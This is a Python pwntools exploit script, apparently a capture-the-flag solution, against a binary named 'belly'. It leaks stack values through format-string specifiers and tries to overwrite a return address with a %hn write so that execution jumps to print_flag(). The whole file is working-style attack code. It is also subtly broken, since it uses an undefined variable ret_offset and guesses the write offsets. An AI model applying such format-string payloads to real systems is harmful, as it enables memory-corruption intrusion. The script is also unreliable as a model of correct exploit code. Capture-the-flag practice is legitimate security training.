#!/usr/bin/env python3
from pwn import *
import re
import sys

# Configure pwntools
context.log_level = 'info'
context.arch = 'amd64'

# Try to load local binary if available, otherwise continue without it
try:
    target_elf = ELF("./belly")
    print("[+] Local binary loaded for analysis")
except:
    target_elf = None
    print("[!] Local binary not found - proceeding with remote exploitation only")

# Connection setup with default remote target
def setup_connection():
    if len(sys.argv) > 1:
        if "local" in sys.argv:
            if target_elf:
                return target_elf.process()
            else:
                print("[-] No local binary available")
                exit(1)
        elif "gdb" in sys.argv:
            if target_elf:
                proc = target_elf.process()
                gdb.attach(proc)
                return proc
            else:
                print("[-] No local binary available for debugging")
                exit(1)
        elif "remote" in sys.argv:
            if len(sys.argv) > 3:
                return remote(sys.argv[2], sys.argv[3])
            else:
                print('usage: ./valley_exploit.py remote <server> <port>')
                exit(1)
    
    # Default to the provided remote target
    print("[*] Connecting to default remote target...")
    return remote('bus_cookie.target', 12345)

def analyze_binary():
    """Analyze the binary to understand the exploitation strategy"""
    if not target_elf:
        print("[!] No local binary available for static analysis")
        print("[*] Proceeding with dynamic exploitation...")
        return
        
    print("[*] Binary Analysis:")
    print(f"[*] Architecture: {target_elf.arch}")
    print(f"[*] Entry point: {hex(target_elf.entry)}")
    
    # Look for interesting functions
    if 'print_flag' in target_elf.symbols:
        print(f"[*] print_flag() found at: {hex(target_elf.symbols['print_flag'])}")
    if 'main' in target_elf.symbols:
        print(f"[*] main() found at: {hex(target_elf.symbols['main'])}")
    
    # Check security mitigations
    print(f"[*] NX: {target_elf.nx}")
    print(f"[*] PIE: {target_elf.pie}")
    print(f"[*] Canary: {target_elf.canary}")

def find_format_string_offsets(target_proc):
    """Find the correct format string offsets by testing"""
    print("[*] Finding format string offsets...")
    
    # Test different offsets to find our controlled input
    test_payload = b"AAAABBBB%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"
    
    try:
        target_proc.sendline(test_payload)
        response = target_proc.recvline(timeout=2)
        print(f"[*] Format string test response: {response}")
        
        # Look for our marker (0x4141414142424242 = "AAAABBBB")
        if b"4141414142424242" in response or b"4242424241414141" in response:
            print("[+] Found controlled input in format string")
            return True
    except:
        print("[!] Format string offset detection failed")
    
    return False

def exploit():
    """Main exploitation function"""
    target_proc = setup_connection()
    
    print("[*] Starting format string exploitation...")
    
    # Step 1: Leak return address to main()
    print("[*] Step 1: Leaking return address...")
    target_proc.recvuntil(b'Try Shouting:')
    target_proc.sendline(b'%21$p')  # Format string to leak stack value at offset 21
    target_proc.recvline()  # consume newline
    
    ret_to_main_leak_line = target_proc.recvline()
    ret_to_main_hex_match = re.search(b"0x[0-9a-f]+", ret_to_main_leak_line)
    
    if not ret_to_main_hex_match:
        print("[-] Failed to leak return address")
        return
    
    ret_to_main_address = int(ret_to_main_hex_match.group(), 16)
    print(f'[+] Return to main() address: {hex(ret_to_main_address)}')
    
    print(f'[+] Return to main() address: {hex(ret_to_main_address)}')
    
    # Step 2: Leak saved RBP (stack frame pointer) - try offset ret_offset-1
    print("[*] Step 2: Leaking saved RBP...")
    rbp_offset = ret_offset - 1  # RBP is typically one offset before return address
    target_proc.sendline(f'%{rbp_offset}$p'.encode())
    
    rbp_leak_line = target_proc.recvline()
    rbp_hex_match = re.search(b"0x[0-9a-f]+", rbp_leak_line)
    
    if not rbp_hex_match:
        print("[-] Failed to leak RBP, trying alternative offsets...")
        # Try a few different offsets around the return address
        for rbp_test_offset in [ret_offset-2, ret_offset-1, ret_offset+1]:
            target_proc.sendline(f'%{rbp_test_offset}$p'.encode())
            rbp_leak_line = target_proc.recvline()
            rbp_hex_match = re.search(b"0x[7][0-9a-f]+", rbp_leak_line)  # Stack addresses usually start with 0x7
            if rbp_hex_match:
                rbp_offset = rbp_test_offset
                break
        
        if not rbp_hex_match:
            print("[-] Could not find RBP, attempting direct exploitation...")
            target_proc.interactive()
            return
    
    rbp_of_main_address = int(rbp_hex_match.group(), 16)
    print(f'[+] Saved RBP (main stack frame): {hex(rbp_of_main_address)}')
    
    # Step 3: Calculate target addresses
    print("[*] Step 3: Calculating exploitation addresses...")
    
    # The return address is stored 8 bytes before the saved RBP
    ret_to_main_stack_addr = rbp_of_main_address - 0x8
    print(f'[+] Return address location on stack: {hex(ret_to_main_stack_addr)}')
    
    # Calculate print_flag() address based on leaked main address
    # We need to determine the correct offset - try multiple common offsets
    possible_offsets = [0x1AA, 0x1A5, 0x1B0, 0x190, 0x200, 0x180]
    
    print("[*] Attempting exploitation with different offsets...")
    
    for target_function_offset in possible_offsets:
        target_address = ret_to_main_address - target_function_offset
        print(f'[*] Trying offset 0x{target_function_offset:x}, target: {hex(target_address)}')
        
        # Step 4: Format string write to overwrite return address
        target_short_value = target_address & 0xFFFF
        
        # Find which argument position we control for writing
        write_offset = 8  # Common position, but may need adjustment
        
        # Construct the format string payload
        payload = b'%' + str(target_short_value).encode() + b'x%' + str(write_offset).encode() + b'$hn'
        
        # Pad to maintain 8-byte alignment
        padding_needed = 16 - len(payload)
        if padding_needed > 0:
            payload += b'.' * padding_needed
        
        # Add the address we want to write to
        payload += p64(ret_to_main_stack_addr)
        
        print(f"[*] Payload: {payload}")
        target_proc.sendline(payload)
        
        # Try to trigger the return
        target_proc.sendline(b'exit')
        
        # Check for success
        try:
            response = target_proc.recv(timeout=2)
            if b'bus' in response or b'flag' in response or b'{' in response:
                print(f"[+] SUCCESS! Flag found with offset 0x{target_function_offset:x}")
                print(f"[+] Response: {response}")
                break
            else:
                print(f"[-] Offset 0x{target_function_offset:x} failed")
                # Reconnect for next attempt
                target_proc.close()
                target_proc = setup_connection()
        except:
            print(f"[-] Offset 0x{target_function_offset:x} caused crash or timeout")
            target_proc.close()
            target_proc = setup_connection()
    
    print("[*] Switching to interactive mode...")
    target_proc.interactive()

def main():
    """Main function with error handling"""
    try:
        analyze_binary()
        exploit()
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()

